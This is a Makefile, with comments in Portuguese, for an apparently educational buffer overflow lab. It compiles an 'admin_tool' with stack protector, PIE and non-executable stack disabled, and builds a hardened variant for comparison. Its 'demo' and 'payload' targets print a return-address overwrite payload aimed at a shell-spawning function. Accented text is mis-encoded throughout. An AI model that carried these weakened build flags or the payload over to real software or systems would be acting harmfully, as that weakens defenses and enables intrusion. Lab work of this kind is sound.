# Makefile para compilar a ferramenta administrativa vulner√°vel

CC = gcc
TARGET = admin_tool
SOURCE = admin_tool.c

# Flags para tornar a vulnerabilidade explor√°vel (apenas para fins educativos)
CFLAGS = -fno-stack-protector \
         -z execstack \
         -no-pie \
         -fno-PIE \
         -g \
         -O0 \
         -Wno-deprecated-declarations

# Regra padr√£o
all: $(TARGET)

# Compilar o programa vulner√°vel
$(TARGET): $(SOURCE)
	@echo "üî® Compilando ferramenta administrativa vulner√°vel..."
	@echo "‚ö†Ô∏è  Flags de seguran√ßa DESABILITADAS para fins educativos!"
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE)
	@echo "‚úÖ Compila√ß√£o conclu√≠da: $(TARGET)"
	@echo "üéØ Endere√ßos importantes:"
	@objdump -t $(TARGET) | grep acessar_shell || echo "   Use objdump -t $(TARGET) para ver endere√ßos"

# Compilar vers√£o segura (para compara√ß√£o)
secure: $(SOURCE)
	@echo "üõ°Ô∏è  Compilando vers√£o SEGURA para compara√ß√£o..."
	$(CC) -fstack-protector-strong -D_FORTIFY_SOURCE=2 -pie -fPIE -o $(TARGET)_secure $(SOURCE)
	@echo "‚úÖ Vers√£o segura criada: $(TARGET)_secure"

# Mostrar informa√ß√µes sobre o bin√°rio
info: $(TARGET)
	@echo "üìä INFORMA√á√ïES DO BIN√ÅRIO:"
	@echo "=========================="
	@file $(TARGET)
	@echo ""
	@echo "üéØ ENDERE√áOS DE FUN√á√ïES:"
	@objdump -t $(TARGET) | grep -E "(acessar_shell|processar_comando_admin|main)"
	@echo ""
	@echo "üîç PROTE√á√ïES DE SEGURAN√áA:"
	@checksec --file=$(TARGET) 2>/dev/null || echo "   Install checksec para ver prote√ß√µes detalhadas"

# Demonstrar o exploit
demo: $(TARGET)
	@echo "üß™ DEMONSTRA√á√ÉO DE BUFFER OVERFLOW:"
	@echo "=================================="
	@echo "1. Uso normal:"
	@./$(TARGET) users
	@echo ""
	@echo "2. Comando admin normal:"
	@./$(TARGET) "admin:test"
	@echo ""
	@echo "3. ‚ö†Ô∏è  Buffer overflow (pode crashar):"
	@echo "   Payload de exemplo (ajuste o endere√ßo):"
	@echo "   ./$(TARGET) \"admin:\$$(python3 -c 'print(\"A\"*76 + \"BBBB\")')\""

# Gerar payload de exemplo
payload: $(TARGET)
	@echo "üéØ GERANDO PAYLOAD DE EXEMPLO:"
	@echo "============================="
	@ADDR=$$(objdump -t $(TARGET) | grep acessar_shell | cut -d' ' -f1); \
	if [ -n "$$ADDR" ]; then \
		echo "Endere√ßo de acessar_shell: 0x$$ADDR"; \
		echo "Payload sugerido:"; \
		echo "./$(TARGET) \"admin:\$$(python3 -c 'import struct; print(\"A\"*76 + struct.pack(\"<I\", 0x$$ADDR).decode(\"latin-1\"))')\""; \
	else \
		echo "Erro: n√£o foi poss√≠vel encontrar o endere√ßo da fun√ß√£o"; \
	fi

# Limpar arquivos compilados
clean:
	rm -f $(TARGET) $(TARGET)_secure
	@echo "üßπ Arquivos limpos"

# Instalar depend√™ncias (para sistemas Ubuntu/Debian)
deps:
	@echo "üì¶ Instalando depend√™ncias para compila√ß√£o 32-bit..."
	@sudo apt update
	@sudo apt install -y gcc-multilib libc6-dev-i386 gdb checksec || echo "‚ö†Ô∏è  Execute manualmente se necess√°rio"

# Help
help:
	@echo "üîß FERRAMENTA ADMINISTRATIVA - MAKEFILE"
	@echo "======================================="
	@echo "Comandos dispon√≠veis:"
	@echo "  make         - Compilar vers√£o vulner√°vel"
	@echo "  make secure  - Compilar vers√£o segura"
	@echo "  make info    - Mostrar informa√ß√µes do bin√°rio"
	@echo "  make demo    - Demonstra√ß√£o b√°sica"
	@echo "  make payload - Gerar payload de exploit"
	@echo "  make deps    - Instalar depend√™ncias"
	@echo "  make clean   - Limpar arquivos"
	@echo ""
	@echo "‚ö†Ô∏è  IMPORTANTE: Use apenas para fins educativos!"

.PHONY: all secure info demo payload clean deps help